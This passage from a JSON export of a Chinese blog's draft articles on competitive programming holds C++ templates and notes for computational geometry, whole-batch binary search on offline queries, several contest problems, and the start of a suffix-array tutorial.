d1=plr(s.s,l),d2=plr(s.t,l);\n    if(d1==0&&d2==0) return 3;\n    if(d1*d2==0) return 1;\n    if(d1*d2<0) return 2;\n    return 0;\n}\ninline Point cp(Line l1,Line l2){\n    double s1=(l1.t-l1.s)^(l2.s-l1.s);\n    double s2=(l1.t-l1.s)^(l2.t-l1.s);\n    return (l2.s*s2-l2.t*s1)/(s2-s1);\n}\n```\n\n## 多边形\n\n### 表示\n\n一般用下标从 0 开始的 Point 数组表示\n\n### 多边形面积\n\n```cpp\ninline double area(Point *pg,int n){\n    double res=0;\n    for(int i=0;i<n;i++) res+=area(Point(0,0),pg[i],pg[(i+1)%n])/2;\n    return res;\n}\n```\n\n### 多边形重心\n\n将多边形三角剖分，计算出每个三角形的重心，然后再以三角形有向面积为权重加权平均\n\n```cpp\ninline Point polygon_center(Point *pg,int n){\n    Point ans(0,0);\n    if(area(pg,n)==0) return ans;\n    for(int i=0;i<n;i++) ans=ans+(pg[i]+pg[(i+1)%n])*area(Point(0,0),pg[i],pg[(i+1)%n]);\n    return ans/area(pg,n)/6;\n}\n```\n\n### 极角序\n\n三四象限的点极角序最小，排序后是从三四象限的点（如果有）逆时针排序\n\n代码是以原点为基点求的极角序，如果要以其他的点为基点，则需要把所有的点都减去那个基点\n\n```cpp\ninline bool pcmp(Point a,Point b){\n    auto f=[](Point p){return p.y>0||(p.y==0&&p.x<0);};\n    if(f(a)!=f(b)) return f(a)<f(b);\n    else if((a^b)==0) return a.x<b.x;\n    else return (a^b)>0;\n}\n```\n\n### 凸包\n\n```cpp\ninline int convex_hull(Point *pg,int n,Point *ch){//会将pg排序并去重，返回凸包顶点数，求的的凸包的点均为顶点，不存在两条边共线\n    sort(pg,pg+n,[](Point a,Point b){\n        if(sgn(a.x-b.x)==0) return sgn(a.y-b.y)<0;\n        return sgn(a.x-b.x)<0;\n    });\n    n=unique(pg,pg+n)-pg;\n    int cnt=0;\n    for(int i=0;i<n;i++){\n        while(cnt>=2&&sgn((ch[cnt-1]-ch[cnt-2])^(pg[i]-ch[cnt-1]))<=0) cnt--;\n        ch[cnt++]=pg[i];\n    }\n    int t=cnt;\n    for(int i=n-2;i>=0;i--){\n        while(cnt>=t+1&&sgn((ch[cnt-1]-ch[cnt-2])^(pg[i]-ch[cnt-1]))<=0) cnt--;\n        ch[cnt++]=pg[i];\n    }\n    if(n>=2) cnt--;\n    return cnt;\n}\n```\n\n### 点在多边形内\n\n#### 射线法\n\n适用于任意多边形。具体原理是从要判断的点水平作射线，穿过了奇数条边则说明在多边形内部，反之则在多边形外部\n\n但有几个特殊情况：如果遇到一个水平的边，则应视为没有穿过边；穿过了两条边交界处，应视为穿过了一个边；穿过了两条边构成的一个角的顶点，则应视为没有穿过边。其中前一种可以特判，后一种可以采取把线段看成上闭下开的形式来解决\n\n```cpp\ninline bool in_polygon(Point p,Point *pg,int n){// pg下标从0开始，在边上也算\n    int ans=0;\n    Point p1,p2;\n    p1=pg[0];\n    for(int i=1;i<=n;i++){\n        p2=pg[i%n];\n        if(on_seg(p,Line(p1,p2))) return true;\n        if(p1.y==p2.y){// 水平边不考虑\n            p1=p2;\n            continue;\n        }\n        if(p.y>min(p1.y,p2.y) && p.y<=max(p1.y,p2.y) && p.x<=max(p1.x,p2.x)){//上取下不取\n            if(p1.x==p2.x) ans++;\n            else{\n                double x=p1.x+(p.y-p1.y)/slope(p1,p2);\n                if(p.x<=x) ans++;\n            }\n        }\n        p1=p2;\n    }\n    return ans&1;\n}\n```\n\n时间复杂度 $O(n)$\n\n#### 叉乘判断\n\n只适用于判断点是否在凸包内\n\n逐个计算点到凸包顶点构成的向量之间的叉乘是否是同号，即判断这些向量是否都往一个方向转，是的话就说明点在该凸包内\n\n![](https://pic.caiwen.work/i/2025/02/18/67b46f833d5ba.png)\n\n时间复杂度 $O(n)$\n\n#### 二分法\n\n只适用于凸包\n\n首先把多边形划分为多个区域\n\n![](https://pic.caiwen.work/i/2025/02/18/67b4701ee315a.png)\n\n![](https://pic.caiwen.work/i/2025/02/18/67b470cc6b966.png)\n\n如果要判断一个点是否在该凸包内，则先找到这个点在哪个区域内。如果不在这几个区域中，则必不在凸包内，否则我们只需要判断这个点和凸包的边的关系即可\n\n![](https://pic.caiwen.work/i/2025/02/18/67b470e7ee9a7.png)\n\n时间复杂度 $O(\\log n)$\n\n```cpp\nint n,m,k,ok=0,cnt=1;cin>>n>>m>>k;\nfor(int i=0;i<n;i++) cin>>p[i].x>>p[i].y;\nn=convex_hull(p,n,ch);\nPoint base=p[0];\nfor(int i=0;i<n;i++) ch[i]=ch[i]-base;\nwhile(m--){\n    Point now;cin>>now.x>>now.y;\n    now=now-base;\n    if(plr(now,Line(ch[0],ch[1]))==0||plr(now,Line(ch[0],ch[n-1]))==0){\n        if(on_seg(now,Line(ch[0],ch[1]))||on_seg(now,Line(ch[0],ch[n-1]))) ok++;\n        continue;\n    }\n    if(!(plr(now,Line(ch[0],ch[1]))==-1&&plr(now,Line(ch[0],ch[n-1]))==1)) continue;\n    int l=1,r=n-1,ans=-1;\n    while(l<=r){\n        int mid=(l+r)>>1;\n        if((ch[mid]^now)>=0) ans=mid,l=mid+1;\n        else r=mid-1;\n    }\n    if(ans==-1||ans==n-1) continue;\n    if(plr(now,Line(ch[ans],ch[ans+1]))!=1) ok++;\n}\nif(ok>=k) cout<<\"YES\"<<endl;\nelse cout<<\"NO\"<<endl;\n```\n\n## 其他\n\n### 平面最近点对\n\n```cpp\nPoint p[_];\nint tmp[_];\ndouble solve(int l,int r){\n    if(l==r) return inf;\n    if(l+1==r) return dis(p[l],p[r]);\n    int mid=(l+r)>>1,cnt=0;\n    double d1=solve(l,mid),d2=solve(mid+1,r),d=min(d1,d2);\n    for(int i=l;i<=r;i++) if(fabs(p[mid].x-p[i].x)<d) tmp[++cnt]=i;\n    for(int i=1;i<=cnt;i++){\n        for(int j=1;j<i;j++){\n            double d3=dis(p[tmp[i]],p[tmp[j]]);\n            d=min(d,d3);\n        }\n    }\n    return d;\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>p[i].x>>p[i].y;\n    sort(p+1,p+n+1,[](Point a,Point b){return sgn(a.x-b.x)==0? sgn(a.y-b.y)<0:sgn(a.x-b.x)<0;});\n    double res=solve(1,n);\n    printf(\"%.4lf\",res);\n}\n```\n\n","summary":"计算几何的板子整理","key":["计算几何"],"tags":[],"path":["算法竞赛","知识点","计算几何.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee79a368177.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"离线算法","id":"offline_algorithm","createTime":"2025-02-08T04:04:18.040Z","updateTime":"2025-09-05T13:34:05.933Z","content":"\n## 整体二分\n\n整体二分的基本思想是，二分出一个 $mid$，然后遍历所有的询问，每个询问都 check 一下 mid 是偏大了还是偏小了。把偏大的询问分成一组，偏小的询问分成另一组。然后这两组询问再分别二分\n\n### P3332 [ZJOI2013] K大数查询\n\nhttps://www.luogu.com.cn/problem/P3332\n\n**题目描述**\n\n你需要维护 $n$ 个可重整数集，集合的编号从 $1$ 到 $n$。\n\n这些集合初始都是空集，有 $m$ 个操作：\n\n- `1 l r c`：表示将 $c$ 加入到编号在 $[l,r]$ 内的集合中\n- `2 l r c`：表示查询编号在 $[l,r]$ 内的集合的并集中，第 $c$ 大的数是多少。\n\n注意可重集的并是不去除重复元素的，如 $\\{1,1,4\\}\\cup\\{5,1,4\\}=\\{1,1,4,5,1,4\\}$。\n\n**数据范围**\n\n$1 \\le n,m \\le 5\\times 10^4$\n\n$1\\le l,r \\le n$\n\n$1$ 操作中 $|c|\\le n$\n\n$2$ 操作中 $1\\le c < 2^{63}$，第 $c$ 大的数存在\n\n**笔记**\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 50004\nint n,arr[_],m,sum[_<<2],tag[_<<2];\ninline void pushup(int k){sum[k]=sum[ls(k)]+sum[rs(k)];}\ninline void pushadd(int k,int l,int r,int v){sum[k]+=v*(r-l+1),tag[k]+=v;}\ninline void pushdown(int k,int l,int r,int mid){if(tag[k])pushadd(ls(k),l,mid,tag[k]),pushadd(rs(k),mid+1,r,tag[k]),tag[k]=0;}\nvoid modify(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushadd(k,l,r,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k,l,r,mid);\n    if(x<=mid) modify(ls(k),l,mid,x,y,v);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return sum[k];\n    int mid=(l+r)>>1,res=0;\n    pushdown(k,l,r,mid);\n    if(x<=mid) res+=query(ls(k),l,mid,x,y);\n    if(y>mid) res+=query(rs(k),mid+1,r,x,y);\n    return res;\n}\nstruct Q{int l,r,x,id,ans,op;} L[_],R[_],q[_];\nvoid solve(int l,int r,int ql,int qr){\n    if(ql>qr) return;\n    if(l==r){\n        for(int i=ql;i<=qr;i++) if(q[i].op==2) q[i].ans=l;\n        return;\n    }\n    int mid=(l+r)>>1;\n    int cntl=0,cntr=0;\n    for(int i=ql;i<=qr;i++){\n        if(q[i].op==1){\n            if(q[i].x>mid) modify(1,1,n,q[i].l,q[i].r,1),R[++cntr]=q[i];\n            else L[++cntl]=q[i];\n        }else{\n            int cnt=query(1,1,n,q[i].l,q[i].r);\n            if(q[i].x<=cnt) R[++cntr]=q[i];\n            else q[i].x-=cnt,L[++cntl]=q[i];\n        }\n    }\n    for(int i=ql;i<=qr;i++) if(q[i].op==1&&q[i].x>mid) modify(1,1,n,q[i].l,q[i].r,-1);\n    for(int i=1;i<=cntl;i++) q[ql-1+i]=L[i];\n    for(int i=1;i<=cntr;i++) q[ql+cntl-1+i]=R[i];\n    solve(l,mid,ql,ql+cntl-1);\n    solve(mid+1,r,ql+cntl,qr);\n}\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1;i<=m;i++) cin>>q[i].op>>q[i].l>>q[i].r>>q[i].x,q[i].id=i;\n    solve(-n,n,1,m);\n    sort(q+1,q+m+1,[](Q x,Q y){return x.id<y.id;});\n    for(int i=1;i<=m;i++) if(q[i].op==2) cout<<q[i].ans<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n因为我们判断 mid 是偏大了还是偏小了，需要知道比 mid 大的数有多少，因此我们把大于 $mid$ 的 $x$ 值加入线段树。并且，如果询问需要归到 $R$ 中，那么也只有 $x$ 值大于 $mid$ 的操作一会影响到这些询问，因此 $x$ 值大于 $mid$ 的操作也归到 $R$ 中\n\n### P3527 [POI 2011] MET-Meteors\n\nhttps://www.luogu.com.cn/problem/P3527\n\n**题目描述**\n\n有 $n$ 个成员国。现在它发现了一颗新的星球，这颗星球的轨道被分为 $m$ 份（第 $m$ 份和第 $1$ 份相邻），第 $i$ 份上有第 $a_i$ 个国家的太空站。\n\n这个星球经常会下陨石雨。BIU 已经预测了接下来 $k$ 场陨石雨的情况。\n\nBIU 的第 $i$ 个成员国希望能够收集 $p_i$ 单位的陨石样本。你的任务是判断对于每个国家，它需要在第几次陨石雨之后，才能收集足够的陨石。\n\n**输入格式**\n\n第一行是两个数 $n,m$。\n\n第二行有 $m$ 个数，第 $i$ 个数 $o_i$ 表示第 $i$ 段轨道上有第 $o_i$ 个国家的太空站。\n\n第三行有 $n$ 个数，第 $i$ 个数 $p_i$ 表示第 $i$ 个国家希望收集的陨石数量。\n\n第四行有一个数 $k$，表示 BIU 预测了接下来的 $k$ 场陨石雨。 接下来 $k$ 行，每行有三个数 $l_i,r_i,a_i$ ，表示第 $k$ 场陨石雨的发生地点在从 $l_i$ 顺时针到 $r_i$ 的区间中（如果 $l_i \\leq r_i$，则是 $l_i, l_i + 1 \n\\cdots, r_i$，否则就是 $l_i, l_i + 1, \n\\cdots m - 1, m, 1, 2, \\cdots r_i$），向区间中的每个太空站提供 $a_i$ 单位的陨石样本。\n\n**数据范围**\n\n$1\\le n,m,k\\le 3\\cdot10^5$；\n\n$1\\le p_i,a_i\\le 10^9$；\n\n**笔记**\n\n把环形的区间加拆成两个操作，然后整体二分即可。整体二分时直接暴力计算每个询问是否满足要求貌似是可以的\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 900005\nint arr[_],n,m;\ninline int lowbit(int x){return x&-x;}\ninline void modify(int x,int v){while(x<=m) arr[x]+=v,x+=lowbit(x);}\ninline int query(int x,int res=0){while(x) res+=arr[x],x-=lowbit(x);return res;}\nstruct Q{int l,r,id,ans,op,x,need;} q[_],L[_],R[_];\nvector<int> g[_];\nvoid solve(int l,int r,int ql,int qr){\n    if(ql>qr) return;\n    if(l==r){\n        for(int i=ql;i<=qr;i++) if(q[i].op==0) q[i].ans=l;\n        return;\n    }\n    int mid=(l+r)>>1,cntl=0,cntr=0;\n    for(int i=ql;i<=qr;i++){\n        if(q[i].op==1){\n            if(q[i].id<=mid) modify(q[i].l,q[i].x),modify(q[i].r+1,-q[i].x),L[++cntl]=q[i];\n            else R[++cntr]=q[i];\n        }else{\n            int s=0;\n            for(auto to:g[q[i].x]){\n                s+=query(to);\n                if(s>=q[i].need) break;\n            }\n            if(s>=q[i].need) L[++cntl]=q[i];\n            else q[i].need-=s,R[++cntr]=q[i];\n        }\n    }\n    for(int i=ql;i<=qr;i++) if(q[i].op==1&&q[i].id<=mid) modify(q[i].l,-q[i].x),modify(q[i].r+1,q[i].x);\n    for(int i=1;i<=cntl;i++) q[ql+i-1]=L[i];\n    for(int i=1;i<=cntr;i++) q[ql+cntl+i-1]=R[i];\n    solve(l,mid,ql,ql+cntl-1);\n    solve(mid+1,r,ql+cntl,qr);\n}\nint need[_];\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1,x;i<=m;i++) cin>>x,g[x].push_back(i);\n    for(int i=1;i<=n;i++) cin>>need[i];\n    int totq,cntq=0;cin>>totq;\n    for(int i=1;i<=totq;i++){\n        int l,r,x;cin>>l>>r>>x;\n        if(l<=r) q[++cntq].l=l,q[cntq].r=r,q[cntq].op=1,q[cntq].id=i,q[cntq].x=x;\n        else q[++cntq].l=1,q[cntq].r=r,q[cntq].op=1,q[cntq].id=i,q[cntq].x=x,q[++cntq].l=l,q[cntq].r=m,q[cntq].op=1,q[cntq].id=i,q[cntq].x=x;\n    }\n    for(int i=1;i<=n;i++) q[++cntq].id=i,q[cntq].x=i,q[cntq].need=need[i];\n    //for(int i=1;i<=cntq;i++) debug(q[i].op),debug(q[i].l),debug(q[i].r);\n    solve(1,totq+1,1,cntq);\n    sort(q+1,q+cntq+1,[](Q x,Q y){return x.id<y.id;});\n    for(int i=1;i<=cntq;i++){\n        if(q[i].op) continue;\n        if(q[i].ans==totq+1) cout<<\"NIE\"<<endl;\n        else cout<<q[i].ans<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"一些离线算法的学习笔记。目前只记了整体二分","key":["离线","二分","整体二分"],"tags":[],"path":["算法竞赛","知识点","离线算法.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"2025寒假复健","id":"2025winter","createTime":"2025-02-07T07:06:59.554Z","updateTime":"2025-09-05T13:34:06.092Z","content":"\n## GSS1 - Can you answer these queries I\n\n线段树\n\nhttps://www.luogu.com.cn/problem/SP1043\n\n**题目描述**\n\n给 $n$ 个数字，$m$ 个询问，每次询问给定区间的最大字段和，$1\\le n,m\\le 5\\times 10^4$\n\n**笔记**\n\n一上来口胡了个分治做法，用主定理分析了一下发现时间复杂度好像是 $O(mn\\log n)$ 的（）\n\n实际上维护区间前缀和最大值、后缀和的最大值、区间和、区间内最大字段和就好了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 50004\nint in[_],n,m;\nstruct Node{int lmax,rmax,sum,seg;} tree[_<<2];\ninline Node merge(Node l,Node r){\n    Node res;\n    res.sum=l.sum+r.sum;\n    res.lmax=max(l.lmax,l.sum+r.lmax);\n    res.rmax=max(r.rmax,r.sum+l.rmax);\n    res.seg=max(max(l.seg,r.seg),l.rmax+r.lmax);\n    return res;\n}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.lmax=nt.rmax=nt.sum=nt.seg=in[l],void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    nt=merge(lt,rt);\n}\nNode query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt;\n    int mid=(l+r)>>1,flag=false;\n    Node res;\n    if(x<=mid) res=query(ls(k),l,mid,x,y),flag=true;\n    if(y>mid){\n        Node rson=query(rs(k),mid+1,r,x,y);\n        if(!flag) res=rson;\n        else res=merge(res,rson);\n    }\n    return res;\n}\ninline void subtask(){\n    cin>>n;for(int i=1;i<=n;i++) cin>>in[i];cin>>m;\n    build(1,1,n);\n    while(m--){\n        int l,r;cin>>l>>r;\n        cout<<query(1,1,n,l,r).seg<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## D - M<=ab\n\n数学、枚举\n\nhttps://atcoder.jp/contests/abc296/tasks/abc296_d\n\n**题目描述**\n\n找到两个正整数 $a$ 和 $b$ 满足 $a,b\\le n$ 且 $a\\times b\\ge m$\n\n**笔记**\n\n上来先对 $m$ 开根，然后以为 $a$ 和 $b$ 必然全都大于等于 $\\sqrt{m}$，wa了两发，发现忘记了可能一个数很小但另一个数很大\n\n然后发现这是经典讨论题，往往需要枚举一个，且枚举花费的时间复杂度是可以接受的。于是这题只需要枚举 $a$，然后求出最小的 $b$，再看看满不满足条件即可\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline int exsqrt(int x){\n    int r=sqrt(x);\n    while((r+1)*(r+1)<=x) r++;\n    while((r-1)*(r-1)>=x) r--;\n    return r;\n}\ninline void subtask(){\n    int n,m;cin>>n>>m;\n    if(n<=1000000&&n*n<m) return cout<<-1,void();\n    int r=exsqrt(m);\n    if(r*r==m) return cout<<m,void();\n    int ans=inf;\n    for(int i=1;i<=r+1;i++){\n        if(m%i==0){\n            if(m/i<=n) return cout<<m,void();\n        }else if((m/i+1)<=n) ans=min(ans,i*(m/i+1));\n    }\n    cout<<ans;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## Nearest vectors\n\nhttps://codeforces.com/problemset/problem/598/C\n\n**题目描述**\n\n给你 $n(1\\le n \\le 10^5)$ 个点，然后让你求出所有原点到这个点的向量中夹角最小的那个\n\n**笔记**\n\n先进行极角排序，然后逐个求夹角就可以了\n\n但关键是怎么搞出最小夹角出来\n\n朴素使用点乘求夹角，然后再比较，会有精度损失，只能过 32 个点\n\n开 long double，精度好一点，但只能过 103 个点\n\n我们再卡一卡，把所有坐标乘 1000，有效果，但也只能过 104 个点\n\n搜题解，得知了一种无精度损失的比较夹角的方法：\n\n对于一个角，我们将其旋转，使一条边与 X 轴平行。假设角度为 $\\theta$，另一条边向量模长为 $v$，则旋转后的点为 $(v\\cos \\theta, v \\sin \\theta)$\n\n我们发现，这两个坐标再同时乘上已经与 X 轴平行的边的模长后，横坐标就变成了点乘，纵坐标就变成了叉乘。而同时乘上一个数是不会改变其与 X ，即原来的边的夹角\n\n对于另外一个角也进行上述操作，于是就转变为判断两个向量，哪个向量与 X 轴夹角更小一点，可以使用叉乘判断\n\n```cpp\n//判断OA1和OB1之间的夹角是不是比OA2和OB2之间的夹角更小\ninline bool angle_less(Point a1,Point b1,Point a2,Point b2){\n    Point t1(a1*b1,abs(a1^b1)),t2(a2*b2,abs(a2^b2));\n    return (t1^t2)>0;\n}\n```\n\n## P3349 [ZJOI2016] 小星星\n\nhttps://www.luogu.com.cn/problem/P3349\n\n**题目描述**\n\n给出一个包含 $n$ 个点的树，以及 $n$ 个点 $m$ 条边的图。现在你需要给这个树每个点分配一个序号，分配的应该为 $n$ 的排列。分配后需要满足如果两个点在树上有连边，那么也应该在图上有连边。求分配方案数\n\n**数据范围**\n\n$1\\le m\\le 17$\n\n**笔记**\n\n考虑 dp，dp 的时候，为了保证分配序号时不会分配重复，我们就遇到了后效性的问题。解决后效性可以把有后效性的因素放到状态里，于是我们可以设 $dp[x][i][S]$ 表示给 $x$ 点分配序号 $i$ ，其子节点分配序号集合为 $S$ 时的方案数。但这样大力 dp 的时间复杂度太高\n\n考虑放松限制。如果我们不必让分配的序号满足是一个排列，那么 dp 就可以变为 $dp[x][i]$。但这样算出来的方案中，可能存在两点分配的序号是相同的。此时就可以考虑容斥了，我们枚举 $\\{1,...,n\\}$ 的子集 $S$。令 $dp[x][i]$ 表示配分在集合 $S$ 中的序号时的方案数。我们计算出 $|S|=n$ 时方案数，减去 $|S|=n-1$ 时方案数，加上 $|S|=n-2$ 时方案数，即可得到答案\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint now,dp[18][18],n,m;\nvector<int> ve[18],ma[18];\nvoid dfs(int x,int fa){\n    for(int i=1;i<=n;i++) if((now&(1<<(i-1)))) dp[x][i]=1;\n    for(auto to:ve[x]){\n        if(to==fa) continue;\n        dfs(to,x);\n        for(int i=1;i<=n;i++){\n            if(!(now&(1<<(i-1)))) continue;\n            int s=0;\n            for(auto j:ma[i]){\n                if(!(now&(1<<(j-1)))) continue;\n                s+=dp[to][j];\n            }\n            dp[x][i]*=s;\n        }\n    }\n}\ninline int popcnt(int x){\n    int res=0;\n    while(x){\n        if(x&1) res++;\n        x>>=1;\n    }\n    return res;\n}\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1;i<=m;i++){\n        int u,v;cin>>u>>v;\n        ma[u].push_back(v);\n        ma[v].push_back(u);\n    }\n    for(int i=1;i<n;i++){\n        int u,v;cin>>u>>v;\n        ve[u].push_back(v);\n        ve[v].push_back(u);\n    }\n    int ans=0;\n    for(now=1;now<(1<<n);now++){\n        memset(dp,0,sizeof(dp));\n        dfs(1,1);\n        int tmp=0;\n        for(int i=1;i<=n;i++){\n            if(!(now&(1<<(i-1)))) continue;\n            tmp+=dp[1][i];\n        }\n        //debug(now);debug(tmp);\n        if((n-popcnt(now))%2) ans-=tmp;\n        else ans+=tmp;\n    }\n    cout<<ans;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## P6628 [省选联考 2020 B 卷] 丁香之路\n\nhttps://www.luogu.com.cn/problem/P6628\n\n贪心+欧拉路+最小生成树\n\n**题目描述**\n\n求 $s$ 到 $i(1\\le i \\le n)$ 的最短路，要求必须经过指定的 $m$ 条边，至少经过一次。点 $x$ 到点 $y$ 的距离为 $|x-y|$\n\n**数据范围**\n\n$1\\le n \\le 2500$\n\n保证 $1\\le s\\le n$；保证 $m\\le \\frac {n(n-1)}2$\n\n**笔记**\n\n如果若有的边都恰好走一次，那么就很像欧拉路问题了。现在所有的边可以不止经过一次，那么我们可以考虑加入一些重复边，转化为欧拉路问题。\n\n我们知道，只要度数均为偶数，那么一定存在欧拉路，于是我们现在只需要想办法加入一些边，让所有的点的度数变成偶数\n\n由于欧拉路还需要两个度数是奇数的点，不太好处理。我们考虑给起点和终点连接一条边权，此时就转为了欧拉回路了\n\n因为题目还要求是最短路，因此我们加入的边权之和应最小\n\n首先考虑将边的度数变成偶数，我们把点的编号从小到大排序，然后直接给相邻的两个度数为奇数的点连边就可以了。仔细思考原图的性质，能够发现度数为奇数的点一定有偶数个，可以两两配对\n\n然后现在我们还面临着连通性的问题。在上面将边的度数变成偶数的连边过程中，对于点 $u$ 和 $v$，$u<v$，我们不去直接将他俩连边，而是选择连接 $(u,u+1)$、$(u+1,u+2)$、......、$(v-1,v)$。这样的话，产生的边权还是一样的，中间的点因为多连了两条边，度数的奇偶性没有发生变化，但是我们多把一些点连接了起来，感性上可以发现能够让连通性变得更强一点。\n\n但还是可能有连通块之间没有连通。我们考虑把涉及到的这些点编号从小到大排序，然后两两连边，跑最小生成树，以最小的代价将整个图连通。值得注意的是跑最小生成树时建边时应该建两个重复的边，来保持度数是偶数。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 2502\ninline int dis(int u,int v){return abs(u-v);}\nstruct UFS{\n    int fa[_],n;\n    UFS(int n){for(int i=1;i<=n;i++) fa[i]=i;this->n=n;}\n    UFS(const UFS &old){\n        n=old.n;\n        for(int i=1;i<=old.n;i++) fa[i]=old.fa[i];\n    }\n    int find(int x){while(x!=fa[x]) x=fa[x]=fa[fa[x]];return x;}\n    void merge(int x,int y){fa[find(x)]=find(y);}\n};\nset<int> se;\nint de1[_],de2[_],n,m,s;\nstruct Edge{int u,v,w;} edge[_];\nint solve(UFS u2,int x){\n    for(int i=1;i<=n;i++) de2[i]=de1[i];\n    de2[s]++,de2[x]++;\n    int res=0,las=0,pre=0,cnt=0;\n    for(auto it=se.begin();it!=se.end();it++){\n        int now=*it;\n        if(it!=se.begin()) edge[++cnt]={las,now,dis(las,now)};\n        las=now;\n        if(de2[now]%2==0) continue;\n        else if(!pre) pre=now;\n        else{\n            res+=dis(pre,now);\n            for(int i=pre+1;i<=now;i++) u2.merge(i-1,i);\n            pre=0;\n        }\n    }\n    sort(edge+1,edge+cnt+1,[](Edge x,Edge y){return x.w<y.w;});\n    for(int i=1;i<=cnt;i++){\n        int u=edge[i].u,v=edge[i].v;\n        if(u2.find(u)==u2.find(v)) continue;\n        res+=2*edge[i].w;\n        u2.merge(u,v);\n    }\n    return res;\n}\ninline void subtask(){\n    cin>>n>>m>>s;se.insert(s);\n    UFS u1(n);\n    int base=0;\n    for(int i=1;i<=m;i++){\n        int u,v;cin>>u>>v;\n        se.insert(u),se.insert(v);\n        de1[u]++,de1[v]++;\n        base+=dis(u,v);\n        u1.merge(u,v);\n    }\n    for(int i=1;i<=n;i++){\n        se.insert(i);\n        cout<<base+solve(u1,i)<<\" \";\n        if(!de1[i]&&i!=s) se.erase(i);\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"2025年寒假做的一些懒得归档的题目的笔记","key":[],"tags":[],"path":["算法竞赛","做题、VP","2025寒假复健.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"后缀数组","id":"sa","createTime":"2025-02-05T03:35:55.218Z","updateTime":"2025-09-05T13:34:05.887Z","content":"\n## 一些定义\n\n**字符串**\n\n- $|s|$ 为字符串 $s$ 的长度\n\n- $s_{i}$ 为字符串 $s$ 的中第 $i$ 个字符，$1\\le i \\le |str|$\n\n- $s[l:r]=s_ls_{l+1}...s_{r-1}s_r$，即 $s$ 区间 $[l,r]$ 的子串\n\n**后缀数组**\n\n我们研究字符串 $s$\n\n- 把$suff_i$ 为字符串 $s$ 的第 $i$ 个后缀，即 $s[i:|s|]$\n\n- 把所有的后缀按字典序排序，$rk_i$ 表示 $suff_i$ 的排名，$sa_i$ 就表示排名为 $i$ 的后缀是字符串 $s$ 的第几个后缀\n- $sa_{rk_i}=i$，$rk_{sa_i}=i$\n\n例如，对于 $s=vamamadn$：\n\n| $i$ | $suff_i$ |\n| --- | -------- |\n| 1   | vamamadn |\n| 2   | amamadn  |\n| 3   | mamadn   |\n| 4   | amadn    |\n| 5   | madn     |\n| 6   | adn      |\n| 7   | dn       |\n| 8   | n        |\n\n| 排名 | $sa_i$ | 对应字符串 |\n| ---- | ------ | ---------- |\n| 1    | 6      | adn        |\n| 2    | 4      | amadn      |\n| 3    | 2      | amamadn    |\n| 4    | 7      | dn         |\n| 5    | 5      | madn       |\n| 6    | 3      | mamadn     |\n| 7    | 8      | n          |\n| 8    | 1      | vamamadn   